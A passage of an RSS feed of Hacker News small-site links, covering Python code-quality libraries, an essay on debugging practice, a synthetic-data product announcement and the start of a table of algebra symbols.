    <span>responses</span><span>.</span><span>add</span><span>(</span><span>responses</span><span>.</span><span>GET</span><span>,</span> <span>'http://twitter.com/api/1/foobar'</span><span>,</span>
                  <span>json</span><span>=</span><span>{</span><span>'error'</span><span>:</span> <span>'not found'</span><span>},</span> <span>status</span><span>=</span><span>404</span><span>)</span>

    <span>resp</span> <span>=</span> <span>requests</span><span>.</span><span>get</span><span>(</span><span>'http://twitter.com/api/1/foobar'</span><span>)</span>

    <span>assert</span> <span>resp</span><span>.</span><span>json</span><span>()</span> <span>==</span> <span>{</span><span>"error"</span><span>:</span> <span>"not found"</span><span>}</span>

    <span>assert</span> <span>len</span><span>(</span><span>responses</span><span>.</span><span>calls</span><span>)</span> <span>==</span> <span>1</span>
    <span>assert</span> <span>responses</span><span>.</span><span>calls</span><span>[</span><span>0</span><span>].</span><span>request</span><span>.</span><span>url</span> <span>==</span> <span>'http://twitter.com/api/1/foobar'</span>
    <span>assert</span> <span>responses</span><span>.</span><span>calls</span><span>[</span><span>0</span><span>].</span><span>response</span><span>.</span><span>text</span> <span>==</span> <span>'{"error": "not found"}'</span>
</code></pre></div></div>




    
      <h2 id="code-coverage">
        
        <a href="#code-coverage">Code coverage</a>
        
      </h2>

<p><a href="https://github.com/nedbat/coveragepy"><strong>Coverage.py</strong></a> measures code coverage, typically during test execution. It uses 
the code analysis tools and tracing hooks provided in the Python standard library to determine which lines are 
executable, and which have been executed.</p>




    
      <h2 id="object-factories">
        
        <a href="#object-factories">Object Factories</a>
        
      </h2>

<p><a href="https://github.com/FactoryBoy/factory_boy"><strong>factory_boy</strong></a> is a fixtures replacement based on thoughtbot’s factory_bot.</p>

<p>As a fixtures replacement tool, it aims to replace static, hard to maintain fixtures with easy-to-use 
factories for complex objects.</p>




    
      <h2 id="code-style">
        
        <a href="#code-style">Code Style</a>
        
      </h2>

<p><a href="https://github.com/wemake-services/wemake-python-styleguide"><strong>wemake-python-styleguide</strong></a> is is strictest and most 
opinionated python linter ever.</p>

<p>Goals of WPS:</p>

<ol>
  <li>Enforce <code>Python 3.6+</code> usage</li>
  <li>Significantly reduce complexity of your code and make it more maintainable</li>
  <li>Enforce “There should be one– and preferably only one –obvious way to do it” rule</li>
  <li>Create consistent coding and naming style</li>
</ol>



<p><a href="https://github.com/PyCQA/pycodestyle"><strong>pycodestyle</strong></a> is a tool to check your Python code against some of the style 
conventions in PEP8.</p>

<p>Features:</p>

<ul>
  <li>Plugin architecture: Adding new checks is easy.</li>
  <li>Parseable output: Jump to error location in your editor.</li>
  <li>Small: Just one Python file, requires only <code>stdlib</code>. You can use just the <code>pycodestyle.py</code> file for this purpose.</li>
  <li>Comes with a comprehensive test suite.</li>
</ul>



<p><a href="https://github.com/psf/black"><strong>Black</strong></a> is the uncompromising Python code formatter. By using it, you agree to cede
control over minutiae of hand-formatting. In return, <em>Black</em> gives you speed,
determinism, and freedom from <code>pycodestyle</code> nagging about formatting. You will save time
and mental energy for more important matters.</p>



<p><a href="https://github.com/google/yapf"><strong>yapf</strong></a> is a formatter for Python files.</p>

<p>YAPF takes a different approach. It’s based off of <code>clang-format</code>, developed by Daniel Jasper. In essence, 
the algorithm takes the code and reformats it to the best formatting that conforms to the style guide, even if the 
original code didn’t violate the style guide. The idea is also similar to the ‘gofmt’ tool for the Go programming 
language: end all holy wars about formatting - if the whole codebase of a project is simply piped through YAPF 
whenever modifications are made, the style remains consistent throughout the project and there’s no point 
arguing about style in every code review.</p>




    
      <h2 id="typing">
        
        <a href="#typing">Typing</a>
        
      </h2>

<p><a href="https://github.com/python/mypy"><strong>mypy</strong></a> is an optional static type checker for Python. You can add type 
hints (PEP 484) to your Python programs, and use <code>mypy</code> to type check them statically. Find bugs in your 
programs without even running them!</p>

<p>Here is a small example to whet your appetite (Python 3):</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>Iterator</span>

<span>def</span> <span>fib</span><span>(</span><span>n</span><span>:</span> <span>int</span><span>)</span> <span>-&gt;</span> <span>Iterator</span><span>[</span><span>int</span><span>]:</span>
    <span>a</span><span>,</span> <span>b</span> <span>=</span> <span>0</span><span>,</span> <span>1</span>
    <span>while</span> <span>a</span> <span>&lt;</span> <span>n</span><span>:</span>
        <span>yield</span> <span>a</span>
        <span>a</span><span>,</span> <span>b</span> <span>=</span> <span>b</span><span>,</span> <span>a</span> <span>+</span> <span>b</span>
</code></pre></div></div>



<p><a href="https://github.com/facebook/pyre-check"><strong>Pyre</strong></a> is a performant type checker for Python compliant with PEP 484. 
Pyre can analyze codebases with millions of lines of code incrementally – providing instantaneous feedback to 
developers as they write code.</p>

<p>Pyre ships with Pysa, a security-focused static analysis tool we’ve built on top of Pyre that reasons about data flows 
in Python …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://isaak.dev/2020/08/python-libraries-to-make-your-code-readable-and-maintainable">https://isaak.dev/2020/08/python-libraries-to-make-your-code-readable-and-maintainable</a></em></p>]]>
            </description>
            <link>https://isaak.dev/2020/08/python-libraries-to-make-your-code-readable-and-maintainable</link>
            <guid isPermaLink="false">hacker-news-small-sites-24275037</guid>
            <pubDate>Tue, 25 Aug 2020 19:25:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Do We Debug?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24274930">thread link</a>) | @iamflimflam1
<br/>
August 25, 2020 | https://blog.cmgresearch.com/2020/08/25/how-do-we-debug.html | <a href="https://web.archive.org/web/*/https://blog.cmgresearch.com/2020/08/25/how-do-we-debug.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <h2 id="a-programming-classic">A programming classic</h2>

<p>There’s a classic programmer joke - the stages of debugging:</p>

<ol>
  <li>That can’t happen</li>
  <li>That doesn’t happen on my machine</li>
  <li>That shouldn’t happen</li>
  <li>Why does that happen</li>
  <li>Oh, I see…</li>
  <li>How did that ever work?</li>
</ol>

<p>It’s funny because it’s true.</p>

<p>But why do we laugh at this? It’s a pretty terrible state of affairs.</p>

<p>There’s a lot to unpack in this joke.</p>

<h3 id="that-cant-happen">“That can’t happen”</h3>

<p>First off why is our reaction immediately to deny the very existence of the bug? It’s unlikely that someone will have gone to the effort of cooking up an elaborate lie to waste our time looking for a non-existent bug.</p>

<p>Bugs are a violation of expectation, someone expected the system to behave in a certain way and it didn’t.</p>

<p>From a developers point of view, our expectations have also been violated. We told the computer to do one thing, and it has decided to something completely different.</p>

<p>This leads to the classic - “there must be a bug in the compiler” or “must be user error” and the equally popular blame the tools: “it’s because we’re using XYZ language or framework - everyone knows it’s buggy/broken”.</p>

<p>Developers take a lot of pride in their work - we’re generally compensated well because we are considered to be experts in our field - suddenly we’re exposed as being just as fallible as the next person.</p>

<p>Obviously the “That can’t happen” is a foolish response. A computer just does what it is told to do. It is not an evil mischievous imp that is deliberately trying to sabotage our work.</p>

<p>We need to change our immediate response to one of acceptance - there’s a bug, no point in pretending it doesn’t exist.</p>

<h3 id="that-doesnt-happen-on-my-machine">“That doesn’t happen on my machine”</h3>

<p>What kind of a developer just chucks code over the wall without testing it? Of <em>course</em> it works on my machine!</p>

<p>Well, what can we say about this one? We could just lump this in with the denial of the bug existence, but it’s worth breaking it out into its own discussion.</p>

<p>In complex systems this is a remote possibility, code that works in isolation may not work when deployed. Interactions between different parts of a system can cause the behaviour to change in unexpected ways.</p>

<p>However, in a well-architected system this should be rare, and if it’s really happening then it’s a sign that something is wrong.</p>

<p>There’s no point saying “it works on my machine” until you’ve actually gone and tried to reproduce the bug on your machine.</p>

<p>Once you can prove categorically that it works on your machine then you can add that to the evidence pile for debugging the problem.</p>

<h3 id="that-shouldnt-happen">“That shouldn’t happen”</h3>

<p>“Umm, yes, that’s why I’ve reported it as a bug” would be the facetious reply.</p>

<p>But this is another facet of the “I told the computer to do this, but instead it’s doing that”. It’s a violation of expectations on the developer’s side of things.</p>

<p>This is usually the phase of acceptance. We’ve now reached the point where we agree that something is wrong, we’ve seen the bug with our own eyes, it’s something wrong with what we’ve done, there’s no more excuses to hide behind.</p>

<h3 id="why-does-that-happen">“Why does that happen?”</h3>

<p>This is where things start to get interesting. This is the fun part bug bashing.</p>

<p>Why is this bug happening? What’s our hypothesis for what we are seeing and how do we test it?</p>

<h3 id="oh-i-see">“Oh, I see”</h3>

<p>The lightbulb moment of insight, through investigation you’ve developed a hypothesis of why the bug is happening and you have an idea on how to fix it.</p>

<p>The problem now becomes impossible not to see. It’s obvious. How did this code ever ship? Which moves up nicely onto the next stage.</p>

<h3 id="how-did-that-ever-work">“How did that ever work?”</h3>

<p>Hindsight is a wonderful thing.</p>

<p>Now that you know how to create the bug, and you know how the code is wrong, you’re wondering which idiot wrote it (spoiler alert - git blame will point the finger at you).</p>

<p>The code could never have worked properly. You’ll start to wonder how many other bits of the codebase are complete nonsense.</p>

<h2 id="adjusting-our-approach">Adjusting our approach</h2>

<p>Let’s turn the programming classic on its head and rewrite the stages of debugging:</p>

<ol>
  <li>This is happening</li>
  <li>Research</li>
  <li>Create a hypothesis</li>
  <li>Test hypothesis</li>
  <li>Fix the problem</li>
  <li>How do we stop this happening again?</li>
</ol>

<h3 id="this-is-happening">“This is happening”</h3>

<p>No point denying it - there’s a bug, I’m glad you found it.</p>

<h3 id="research">Research</h3>

<p>We need to gather information on the bug:</p>

<ul>
  <li>how do we reproduce it?</li>
  <li>what test data do we need?</li>
  <li>how much of the system do we need to run recreate it?</li>
  <li>what’s the minimum I need to recreate to debug it?</li>
  <li>which part of the codebase is it happening in?</li>
  <li>which bit of code is the likely problem?</li>
  <li>do we have any relevant logs from when the problem occurred?</li>
</ul>

<p>The more information we can gather the better.</p>

<h3 id="create-a-hypothesis">Create a hypothesis</h3>

<p>Our research should have pointed us at the potential problem, we should have developed enough knowledge to form a working hypothesis on what the bug is caused by. We should hopefully be looking at the bit of code that is wrong and have an idea on how to fix it.</p>

<h3 id="test-hypothesis">Test hypothesis</h3>

<p>How are you going to test your fix works?</p>

<p>Before jumping in and changing code can you definitely recreate the bug? Does it happen consistently in your test environment?</p>

<p>Can you write a unit test to recreate the bug?</p>

<p>When you apply your fix does the test now pass? When you run through the steps to recreate does it now consistently work?</p>

<h3 id="fix-the-problem">Fix the problem</h3>

<p>If we’re lucky the previous step proves that our thinking was correct, we’ve changed the code and everything works.</p>

<p>Clean up any debugging code go through code reviews and deploy - everyone is happy!</p>

<p>Don’t forget to check that you’ve not broken anything else…</p>

<p>The bug is fixed when the person who raised the bug in the first place is happy.</p>

<h3 id="how-do-we-stop-this-happening-again">How do we stop this happening again?</h3>

<p>This is the real value in finding and fixing bugs. The bug should never have happened in the first place.</p>

<ul>
  <li>Are we missing unit tests for this part of the codebase?</li>
  <li>Have we missed a whole class of unit tests across the codebase that make this kind of bug more likely?</li>
  <li>Are we missing integration tests?</li>
  <li>Do we have automated tests to catch these bugs?</li>
  <li>Is there something wrong in our process that allowed this bug to slip through the net?</li>
</ul>

<h2 id="types-of-bugs">Types of Bugs</h2>

<p>What kind of bugs do we encounter? And how do we fix them?</p>

<h3 id="easy-bugs">Easy(?) Bugs</h3>

<p>There’s a set of bugs that can be classed as “easy(?)”. There’s a question mark next to the easy as a bug being obvious or repeatable does not necessarily mean the finding the underlying cause and fixing it is necessarily easy.</p>

<ul>
  <li>UI Bugs</li>
  <li>Bugs of Omission or Misinterpretation</li>
  <li>Repeatable bugs</li>
</ul>

<h3 id="ui-bugs">UI Bugs</h3>

<p>It functions but it doesn’t look right.</p>

<p>UI bugs tend to revolve around the styling and positioning of elements.</p>

<p>Well organised companies will have wireframes and high definition mockups that you should be working from. They should have style guides and component libraries that tell you how things should look and behave.</p>

<p>Sometimes, we are working in the dark, there may not have been time or resources to design wireframes and mockups, you may be working from some scribbles on a napkin - make sure you fit with the rest of the application. Don’t break people’s expectations!</p>

<p>Another source of these bugs are different device formats - maybe it’s fine on your large desktop monitor, but on small laptops or mobile devices the UI you’ve created just doesn’t work.</p>

<p>There’s also a class of bugs around accessibility issues - these often get overlooked and unless attention is paid to this area it’s easy to forget about it only to have it flagged by a diligent QA person.</p>

<p>Solving these bugs should be straightforward:</p>

<ul>
  <li>What is it supposed to look like?</li>
  <li>Make it look right</li>
  <li>Test on the correct target devices and sizes</li>
</ul>

<p>There may be some fundamental process issues to be addressed here - someone knows what it should look like as they have raised the bug.</p>

<p>Why didn’t you know what it was supposed to look like when you built it?</p>

<h3 id="bugs-of-omission-or-misinterpretation">Bugs of Omission or Misinterpretation</h3>

<p>You thought you’d built the right thing.</p>

<p>You didn’t…</p>

<p>In theory, this should be an easy one to fix - find out what was supposed to be built, build it…</p>

<p>There are some questions to be asked around what went wrong in this situation - was the task not specified in enough detail, is there a communication gap between the product managers and the dev team that leads to the wrong thing being built?</p>

<p>Or did you just fundamentally misunderstand what was being asked of you?</p>

<p>Sometimes it’s simply a case of trying to hit a moving target. By the time you’ve finished building something everyone’s understanding of what should be built has changed. Expectations have changed and someone forgot to tell you…</p>

<p>Something is broken in your process - it’s important to work out what it is if this class of bug keeps occurring.</p>

<h3 id="repeatable-bugs">Repeatable bugs</h3>

<p>Every time I do these steps, this thing happens, it’s not what I expect to happen, it should do this instead.</p>

<p>This is a nice class of bugs - repeatable with a clear set of steps to recreate the problem.</p>

<p>Should be an easy fix:</p>

<ul>
  <li>Look at the application logs whilst recreating the bug</li>
  <li>Inspect any relevant crash logs and stack traces</li>
  <li>Run through the steps with a debugger attached and have it break on exceptions</li>
  <li>Simply walk through the code and sanity check it - does it make sense?</li>
</ul>

<p>However, for new developers or people unfamiliar with the codebase these can also be extremely frustrating bugs.</p>

<p>I can happily recreate the bug, it breaks on my machine, I have no idea where to even start looking in the codebase for where to fix it.</p>

<p>Senior developer strolls over, takes one look at the bug and immediately brings up the line of code that is the problem.</p>

<p>Someone who knows the codebase intimately will probably know where most data in the system is coming from and will appear to have some magical power for identifying where a bug it.</p>

<p>This is why bug fixing a few simple bugs can be such a good onboarding process.</p>

<p>What can we do if we don’t know the codebase?</p>

<p>We’ll need to start employing our powers of detection and deduction.</p>

<p>Look at the architecture of the system, how does data flow from one place to another. What are good …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.cmgresearch.com/2020/08/25/how-do-we-debug.html">https://blog.cmgresearch.com/2020/08/25/how-do-we-debug.html</a></em></p>]]>
            </description>
            <link>https://blog.cmgresearch.com/2020/08/25/how-do-we-debug.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24274930</guid>
            <pubDate>Tue, 25 Aug 2020 19:16:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Firefox’s criteria for installable web apps]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24274732">thread link</a>) | @SimeVidas
<br/>
August 25, 2020 | https://webplatform.news/issues/2020-08-25 | <a href="https://web.archive.org/web/*/https://webplatform.news/issues/2020-08-25">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://webplatform.news/issues/2020-08-25</link>
            <guid isPermaLink="false">hacker-news-small-sites-24274732</guid>
            <pubDate>Tue, 25 Aug 2020 18:58:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Open source platform for making synthetic data, sharing it]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24274535">thread link</a>) | @watson1008
<br/>
August 25, 2020 | https://gretel.ai/blog/readme-v2 | <a href="https://web.archive.org/web/*/https://gretel.ai/blog/readme-v2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main"><div><div><h2>We founded Gretel based on our beliefs that data shouldn’t be scary.</h2><figure><img src="https://uploads-ssl.webflow.com/5ec4696a9b6d337d51632638/5f45361b7ebe7f6e8e7ed9cd_Readmev2.png" alt="" sizes="(max-width: 479px) 97vw, (max-width: 767px) 100vw, 600px" srcset="https://uploads-ssl.webflow.com/5ec4696a9b6d337d51632638/5f45361b7ebe7f6e8e7ed9cd_Readmev2-p-1080.png 1080w, https://uploads-ssl.webflow.com/5ec4696a9b6d337d51632638/5f45361b7ebe7f6e8e7ed9cd_Readmev2.png 1440w"></figure><div><p><strong>It’s way too hard- sometimes seemingly impossible- to safely share and collaborate with sensitive data.</strong> We have a solution to this problem that we and every developer faces each day. We founded Gretel based on our beliefs that data shouldn’t be scary, and for you to compete in today’s world, you need to be able to use and learn from your data. </p><p>Companies like Amazon, Google, and Apple have the resources to give the developers the best of both worlds- data privacy and streamlined access to data. We’re here to make that possible for any developer.</p><p>In February we published our first <a href="https://gretel.ai/blog/gretel-readme">README</a> and started laying out our goal of enabling developers to safely share and collaborate with sensitive data, and our vision of democratizing building with data so everyone can use it. We asked for your feedback and ideas, and promised to share research, open source code, and provide examples. </p><p>In the 6 months since then, we have had conversations with nearly 100 developers and companies to understand the barriers to working with sensitive data and how we can apply privacy-enhancing technology to break down those barriers. Here is what we learned:</p><ul role="list"><li><strong>It can take developers months to get access to sensitive data to test an idea</strong>. Often this requires PM and legal approvals, snap-shots of production databases, and manual anonymization of sensitive fields. </li><li><strong>Privacy is an engineering problem, not a policy problem</strong>. Policies are open to interpretation, lack enforceability at different stages of a workflow, and eventually get abused. </li><li><strong>Fairness and ethics in AI is incredibly important. Datasets used to power AI in our lives are often limited and imbalanced, leading to bias against users and groups. &nbsp;</strong>‍</li></ul><p>In the past year, we have built a set of open-source SDKs that enable developers to label and share access to data, composable APIs to enable transformations to streaming data, and an &nbsp;open-source AI-based synthetic data library that can generate artificial datasets from sensitive data with <a href="https://gretel.ai/blog/using-generative-differentially-private-models-to-build-privacy-enhancing-synthetic-datasets-from-real-data">provable privacy guarantees</a>, and automatically boost minority classes in datasets to <a href="https://gretel.ai/blog/reducing-ai-bias-with-synthetic-data">reduce AI bias</a>.</p><p>Today, we are thrilled to release <a href="https://console.gretel.cloud/login">Gretel’s public beta to any developer</a>. It’s free, and you can get started in minutes with one of our guides for <a href="https://gretel.ai/gretel-cloud-faqs/how-do-i-get-started">labeling and sharing a dataset in 2 minutes</a>, or even generating <a href="https://www.youtube.com/watch?v=gS7kpR-LJTs&amp;t=144s">your first synthetic dataset</a> with differential privacy guarantees.</p><p>We are building Gretel for developers like you, so don’t be shy. Please follow us here, <a href="https://twitter.com/gretel_ai">Twitter</a>, and <a href="https://github.com/gretelai/gretel-synthetics">Github</a>. Want to see for yourself? <a href="https://console.gretel.cloud/login">Get started now!</a> We’re <a href="https://gretel.ai/cdn-cgi/l/email-protection#650d0c250217001100094b040c"><span data-cfemail="c3abaa83a4b1a6b7a6afeda2aa">[email&nbsp;protected]</span></a>.<br></p></div><a href="https://gretel.ai/blog"><p>View all posts</p></a></div></div></div></div>]]>
            </description>
            <link>https://gretel.ai/blog/readme-v2</link>
            <guid isPermaLink="false">hacker-news-small-sites-24274535</guid>
            <pubDate>Tue, 25 Aug 2020 18:40:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Modern algebra in 16 tables and 200 symbols]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24274474">thread link</a>) | @R3G1R
<br/>
August 25, 2020 | https://mathvault.ca/hub/higher-math/math-symbols/algebra-symbols/ | <a href="https://web.archive.org/web/*/https://mathvault.ca/hub/higher-math/math-symbols/algebra-symbols/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div><div id="theme-content-section"><div><section data-css="tve-u-16ec5d248bb"><p><span>A</span>lgebra is a subfield of mathematics pertaining to the manipulation of symbols and their governing rules. The following is a compilation of <strong>symbols</strong> from the different branches of algebra, which include basic algebra, number theory, linear algebra and abstract algebra.</p><p>For readability purpose, these symbols are categorized by their function and topic into <strong>charts</strong> and <strong>tables</strong>. Other comprehensive lists of symbols — as categorized by subject&nbsp;and type — can be also found in the relevant pages below (or in the navigational panel).</p><div><div><div><figure><img loading="lazy" width="400" height="518" src="https://mathvault.ca/wp-content/uploads/Math-Symbols-eBook-Cover.png" alt="Cover of Math Vault's Comprehensive List of Mathematical Symbols eBook" title="Math Symbols eBook Cover"></figure><div><p>Prefer the PDF version instead?</p><p>Get the master summary of mathematical symbols in <strong>eBook form</strong> — along with each symbol’s usage and LaTeX code.</p></div></div></div></div><h2><span id="Constants"></span>Constants<span></span></h2><p>In algebra, <strong>constants</strong> are symbols used to denote key mathematical elements and sets. The following tables document the most common of these — along with each symbol’s name, usage and example.</p><p>(For common constants in general, see <a href="https://mathvault.ca/hub/higher-math/math-symbols/common-math-symbols/#Mathematical_Constants" target="_blank" rel="noopener noreferrer">common math constants</a>.)</p><h3><span id="Key_Mathematical_Elements"></span>Key Mathematical Elements<span></span></h3><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$i$</td><td><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Imaginary_unit" target="_blank"><strong>Imaginary unit</strong></a></td><td>$i^2 + 1 = 0$</td></tr><tr><td>$\mathbf{0}$, $\vec{0}$</td><td><strong><a href="https://en.wikipedia.org/wiki/Zero_element#Additive_identities" target="_blank" aria-label="Zero vector (opens in a new tab)" rel="noreferrer noopener">Zero vector</a></strong></td><td>$\mathbf{0} \ne 0$</td></tr><tr><td>$O$</td><td><strong><a href="https://en.wikipedia.org/wiki/Zero_matrix" target="_blank" aria-label="Zero matrix (opens in a new tab)" rel="noreferrer noopener">Zero matrix</a></strong></td><td>$O_{2 \times 3} = \\ \begin{pmatrix} 0 &amp; 0 &amp; 0 \\ 0 &amp; 0 &amp; 0 \end{pmatrix}$</td></tr><tr><td>$I$</td><td><strong><a aria-label="$n$-dimensional identity matrix (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Identity_matrix" target="_blank">Identity matrix</a></strong></td><td>$I_2 = \begin{pmatrix} 1 &amp; 0 \\ 0 &amp; 1 \end{pmatrix}$</td></tr><tr><td>$e$</td><td><a href="https://en.wikipedia.org/wiki/Identity_element" target="_blank" aria-label="Identity element of a group (opens in a new tab)" rel="noreferrer noopener"><strong>Identity element of a group</strong></a></td><td>For all $g \in G$, $g \circ e = e \circ g = g$.</td></tr></tbody></table></figure><h3><span id="Key_Mathematical_Sets"></span>Key Mathematical Sets<span></span></h3><p>In algebra, certain sets of numbers (or other more elaborated objects) tend to occur more frequently than others. These sets are often denoted by some variants of <strong>alphabetical letters</strong>&nbsp;— many of which are of the <a href="https://mathvault.ca/hub/higher-math/math-symbols/greek-hebrew-latin-symbols/#Latin-based_Alphabets" target="_blank" rel="noopener noreferrer">blackboard bold</a> typeface.</p><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$\mathbb{P}$</td><td>Set of <strong>prime numbers</strong></td><td>$127 \in \mathbb{P}$</td></tr><tr><td>$\mathbb{N}_0$</td><td>Set of <strong>natural numbers</strong> <br>(starting with $0$)</td><td>$0 \in \mathbb{N}_0$</td></tr><tr><td>$\mathbb{N}_1$</td><td>Set of <strong>natural numbers</strong><br>(starting with $1$)</td><td>$0 \notin \mathbb{N}_1$</td></tr><tr><td>$\mathbb{Z}$</td><td>Set of <strong>integers</strong></td><td>For all $x, y \in \mathbb{N}$, $x-y \in \mathbb{Z}$.</td></tr><tr><td>$\mathbb{Z}_+$</td><td>Set of <strong>positive integers</strong></td><td>$\mathbb{Z}_+ = \mathbb{N}_1$</td></tr><tr><td>$\mathbb{Q}$</td><td>Set of <strong>rational numbers</strong></td><td>$3.\overline{73} \in \mathbb{Q}$</td></tr><tr><td>$\mathbb{Q}_p$</td><td>Set of <strong><a href="https://en.wikipedia.org/wiki/P-adic_number#Introduction" target="_blank" aria-label="p-adic numbers (opens in a new tab)" rel="noreferrer noopener">p-adic numbers</a></strong></td><td>In $\mathbb{Q}_{10}$, $-1 = …999$ (as $1 +  …999  = 0$).</td></tr><tr><td>$\mathbb{A}$</td><td>Set of <strong><a aria-label="algebraic numbers (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Algebraic_number" target="_blank">algebraic numbers</a></strong></td><td>$\sqrt{5} + 3 \in \mathbb{A}$</td></tr><tr><td>$\mathbb{R}$</td><td>Set of <strong><a href="https://en.wikipedia.org/wiki/Real_number" target="_blank" aria-label="real numbers (opens in a new tab)" rel="noreferrer noopener">real numbers</a></strong></td><td>$i \notin \mathbb{R}$</td></tr><tr><td>$\mathbb{R}_+$</td><td>Set of <strong><a href="https://en.wikipedia.org/wiki/Positive_real_numbers" target="_blank" aria-label="positive real numbers (opens in a new tab)" rel="noreferrer noopener">positive real numbers</a></strong></td><td>For all $x, y \in \mathbb{R}_+$, $xy \in \mathbb{R}_+$.</td></tr><tr><td>$\mathbb{R}_-$</td><td>Set of <strong><a href="https://en.wikipedia.org/wiki/Real_number#Vocabulary_and_notation" target="_blank" aria-label="negative real numbers (opens in a new tab)" rel="noreferrer noopener">negative real numbers</a></strong></td><td>If $a, b \in \mathbb{R}_-$, then $a+b \in \mathbb{R}_-$.</td></tr><tr><td>$\mathbb{R}-\mathbb{Q}$</td><td>Set of <strong><a href="https://en.wikipedia.org/wiki/Irrational_number" target="_blank" aria-label="irrational numbers (opens in a new tab)" rel="noreferrer noopener">irrational numbers</a></strong></td><td>$\log 2 \in \mathbb{R}-\mathbb{Q}$</td></tr><tr><td>$\mathbb{I}$</td><td>Set of <strong><a href="https://en.wikipedia.org/wiki/Imaginary_number" target="_blank" aria-label="imaginary numbers (opens in a new tab)" rel="noreferrer noopener">imaginary numbers</a></strong></td><td>$5i \in \mathbb{I}, 2+3i \notin \mathbb{I}$</td></tr><tr><td>$\mathbb{C}$</td><td>Set of <strong><a href="https://en.wikipedia.org/wiki/Complex_number" target="_blank" aria-label="complex numbers (opens in a new tab)" rel="noreferrer noopener">complex numbers</a></strong></td><td>There exists a number $x \in \mathbb{C}$ such that $x^2 + 2x + 3 = 0$.</td></tr><tr><td>$\mathbb{H}$</td><td>Set of <strong><a href="https://en.wikipedia.org/wiki/Quaternion" target="_blank" aria-label="quaternions (opens in a new tab)" rel="noreferrer noopener">quaternions</a></strong></td><td>$5+6i-2j+3k \in \mathbb{H}$</td></tr><tr><td>$\mathbb{O}$</td><td>Set of <strong><a href="https://en.wikipedia.org/wiki/Octonion" target="_blank" aria-label="octonions (opens in a new tab)" rel="noreferrer noopener">octonions</a></strong></td><td>$e_0 + \cdots + e_7 \in \mathbb{O}$</td></tr><tr><td>$\mathbb{R}^n$</td><td>N-dimensional <strong><a href="https://en.wikipedia.org/wiki/Euclidean_space" target="_blank" aria-label="Euclidean space (opens in a new tab)" rel="noreferrer noopener">Euclidean space</a></strong></td><td>$\mathbf{i}, \mathbf{j}, \mathbf{k} \in \mathbb{R}^3$</td></tr><tr><td>$B_r(p)$</td><td><strong><a aria-label="Ball (opens in a new tab)" href="https://en.wikipedia.org/wiki/Ball_(mathematics)#In_general_metric_spaces" target="_blank" rel="noreferrer noopener">Open ball</a></strong> of radius $r$ around point $p$</td><td>$(0.5, 0.8, 0.4) \notin$<br>$B_1(0)$</td></tr><tr><td>$\mathbb{Z}_n$</td><td>Set of <strong><a href="https://en.wikipedia.org/wiki/Modular_arithmetic#Integers_modulo_n" target="_blank" aria-label="integers modulo $n$ (opens in a new tab)" rel="noreferrer noopener">integers modulo $n$</a></strong></td><td>$[24] = [11] \in \mathbb{Z}_{13}$</td></tr><tr><td>$R^{m \times n}$</td><td>Set of <strong><a aria-label="$m \times n$ matrices (opens in a new tab)" href="https://en.wikipedia.org/wiki/Matrix_(mathematics)#Notation" target="_blank" rel="noreferrer noopener">$m \times n$ matrices</a></strong> with entries from ring $R$</td><td>$\begin{pmatrix} 2 &amp; 3 \\ 1 &amp; 4 \end{pmatrix} \in \mathbb{R}^{2 \times 2}$</td></tr><tr><td>$GL_n(R)$</td><td>Group of <strong><a href="https://en.wikipedia.org/wiki/General_linear_group" target="_blank" aria-label="$n \times n$ invertible matrices (opens in a new tab)" rel="noreferrer noopener">$n \times n$ invertible matrices</a></strong> with entries from ring $R$</td><td>$\begin{pmatrix} 1 &amp; 0 \\ 2 &amp; 0 \end{pmatrix} \notin GL_2(\mathbb{R})$</td></tr><tr><td>$S_n$</td><td><strong><a href="https://en.wikipedia.org/wiki/Symmetric_group" target="_blank" aria-label="Symmetric group (opens in a new tab)" rel="noreferrer noopener">Symmetric group</a></strong> on a set of $n$ elements</td><td>$|S_n| = n!$</td></tr><tr><td>$R^{\times}$</td><td><strong><a href="https://en.wikipedia.org/wiki/Unit_(ring_theory)#Group_of_units" target="_blank" aria-label="Group of units (opens in a new tab)" rel="noreferrer noopener">Group of units</a></strong> of ring $R$</td><td>$x \in \mathbb{Z}^{\times}$ if $x \in \mathbb{Z}$ and $\exists y \in \mathbb{Z}$ such that $xy = yx = 1$.</td></tr><tr><td>$R[x]$</td><td><strong><a href="https://en.wikipedia.org/wiki/Polynomial_ring" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener">Polynomial ring</a></strong> with coefficients from ring $R$</td><td>$-3x^3 + x^2 + 2x +1$<br>$\in \mathbb{Z}[x]$</td></tr></tbody></table></figure><h2><span id="Variables"></span>Variables<span></span></h2><p>Since algebra is concerned with the manipulation of mathematical symbols, it often draws upon a wide range of <strong>variables</strong> as placeholders for varying objects and quantities. The following table documents the most common of these — along with their respective usage and example.</p><figure><table><thead><tr><th>Symbol Name</th><th>Used For</th><th>Example</th></tr></thead><tbody><tr><td>$m, n, p, q$</td><td><strong>Natural numbers</strong> and 